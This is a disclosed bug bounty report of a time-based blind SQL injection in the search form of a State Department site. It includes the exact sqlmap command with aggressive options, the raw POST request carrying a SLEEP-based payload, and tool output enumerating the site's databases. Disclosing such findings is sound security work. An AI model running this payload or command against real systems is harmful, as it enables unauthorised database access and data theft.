# Time Based SQL Injection

## Report Details
- **Report ID**: 1878584
- **URL**: https://hackerone.com/reports/1878584
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-02-18T18:25:48.344Z
- **Disclosed**: 2023-04-20T17:56:14.942Z

## Reporter
- **Username**: shadow-krd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: us-department-of-state

## Vulnerability Information
Hello and greetings and respect to you, dear friends
We all know that the sql injection bug is very dangerous, so this bug should be eliminated as soon as possible.
I've identified an SQL injection vulnerability of  type  Time Based on https://diplomaticrooms.state.gov this site use wordpress  cms but its not plugin sql injection 
Below, we see how we found this vulnerability 
If you look carefully, we see that search in the website name Search results The gap has occurred there
as you can see POST Method  [POST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt ]
now it's time to inject or generate POC with lovely tool sqlmap 
We used a text file here by Name request.txt
and this is our command in sqlmap you can use this command for your own confidence

python3 sqlmap.py -r  request --batch --random-agent --tamper=space2comment  --level=5 --risk=3 --drop-set-cookie --threads 10  --dbs
===========================================================================================
POST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt HTTP/1.1
Host: diplomaticrooms.state.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: https://diplomaticrooms.state.gov/?s=porcelain,%20gilt
Content-Length: 133
Cookie: AWSALB=Bcs9ZrXwIhoRbHdfPbZAnVhkYJt9OJslAaUUgh5cOw9FMhg/43C2umhc4fQe7PtAorAHMSdr2dNw0asilWMYXjaFigXJhQJ2lxs05WQbpeI/cYRSGXLyo4E+hiQ1; AWSALBCORS=Bcs9ZrXwIhoRbHdfPbZAnVhkYJt9OJslAaUUgh5cOw9FMhg/43C2umhc4fQe7PtAorAHMSdr2dNw0asilWMYXjaFigXJhQJ2lxs05WQbpeI/cYRSGXLyo4E+hiQ1
Connection: Close
search=porcelain%2C+gilt%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29Xeps%29+AND+%27HlBp%27%3D%27HlBp&post_types%5B%5D=post
======================================================================================
 python3 sqlmap.py -r  request --batch --random-agent --tamper=space2comment  --level=5 --risk=3 --drop-set-cookie --threads 10  --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.1.5#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:21:06 /2023-02-17/

[12:21:06] [INFO] parsing HTTP request from 'request'
[12:21:06] [INFO] loading tamper module 'space2comment'
[12:21:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9b5) Gecko/2008041514 Firefox/3.0b5' from file '/home/ubuntu/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[12:21:06] [INFO] resuming back-end DBMS 'mysql'
[12:21:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: search=porcelain, gilt' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp&post_types[]=post
---
[12:21:07] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[12:21:07] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.16
back-end DBMS: MySQL 5 (MariaDB fork)
[12:21:07] [INFO] fetching database names
[12:21:07] [INFO] fetching number of databases
[12:21:14] [WARNING] reflective value(s) found and filtering out
[12:21:14] [INFO] resumed: 6
[12:21:14] [INFO] retrieving the length of query output
[12:21:14] [INFO] retrieved: 18
[12:22:32] [INFO] retrieved: information_schema
[12:22:32] [INFO] retrieving the length of query output
[12:22:32] [INFO] retrieved: 5
[12:23:01] [INFO] retrieved: mysql
[12:23:01] [INFO] retrieving the length of query output
[12:23:01] [INFO] retrieved: 3
[12:23:39] [INFO] retrieved: tmp
[12:23:39] [INFO] retrieving the length of query output
[12:23:39] [INFO] retrieved: 6
[12:24:16] [INFO] retrieved: innodb
[12:24:16] [INFO] retrieving the length of query output
[12:24:16] [INFO] retrieved: 18
[12:25:33] [INFO] retrieved: performance_schema
[12:25:33] [INFO] retrieving the length of query output
[12:25:33] [INFO] retrieved: 8
[12:26:15] [INFO] retrieved: pantheon
available databases [6]:
[*] information_schema
[*] innodb
[*] mysql
[*] pantheon
[*] performance_schema
[*] tmp

Notice:
I didn't extracted any data from the database, but just for generate POC

## Impact

the hackers can be dump all information like all database tables then after that login to the website

available databases [6]:
[*] information_schema
[*] innodb
[*] mysql
[*] pantheon
[*] performance_schema
[*] tmp

## Attachments
- photo_2023-02-18_20-20-40.jpg
